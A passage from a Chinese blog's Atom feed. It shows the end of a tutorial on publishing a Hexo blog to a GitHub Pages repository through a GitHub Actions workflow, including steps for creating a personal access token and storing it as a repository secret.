class="string">actions/setup-node@v4</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;18&quot;</span></span><br><span class="line">          </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">hexo</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line">        </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装搜索</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-generator-search</span> <span class="string">--save</span></span><br><span class="line">        </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">markdown</span> <span class="string">图片索引</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-image-link</span> <span class="string">--save</span></span><br><span class="line">        </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line">        </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">发布到公共仓库</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">personal_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.PUBLISH_BLOG</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">          <span class="attr">destination_dir:</span> <span class="string">blog</span></span><br><span class="line">          <span class="attr">external_repository:</span> [<span class="string">your_name</span>]<span class="string">/[your_name].github.io</span></span><br><span class="line">          <span class="attr">publish_branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><p>我这里是跨仓库发布，因此需要一个 TOKEN，上面我命名的这个 <code>secrets.PUBLISH_BLOG</code></p><p>登录 Github 之后，打开 <a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 页面</p><img src="/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20240929150803.png" class=""><ol><li>这里的 Note 可以随便设置，是用于区分 token 的，以便于看到后可以快速回忆起，建议设置成仓库名：Blog_token</li><li>Expiration 是可以时间，我嫌麻烦一般设置成永久，安全起见可以设置成 90 天，然后过期再更新</li><li>下面的作用范围只需要勾选 workflow 就行，会自动选中 repo 权限</li></ol><p>生成后会得到一个密钥，先复制下来待会要用</p><img src="/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20240929151040.png" class=""><p>打开 <a href="https://github.com/fermionorz/blog/settings/secrets/actions/new">https://github.com/fermionorz/blog/settings/secrets/actions/new</a> 页面，添加刚刚复制的密钥</p><img src="/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20240929151247.png" class=""><p>添加成功后的效果</p><img src="/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20240929151323.png" class=""><p>这里就没问题了，这个时候每次对仓库进行提交，都会自动把内容发布到 <code>[your_name]/[your_name].github.io</code> 仓库的 <code>blog</code> 目录中</p><p>然后可以转到 <code>[your_name].github.io</code> 仓库看到了</p><img src="/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20240929151818.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;目前的解决方案：Hexo &amp;amp; cactus + Github Action&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Blog&quot;&gt;&lt;a href=&quot;#Blog&quot; class=&quot;headerlink&quot; title=&quot;Blog&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="Site" scheme="http://fermionorz.github.io/tags/Site/"/>
    
  </entry>
  
</feed>
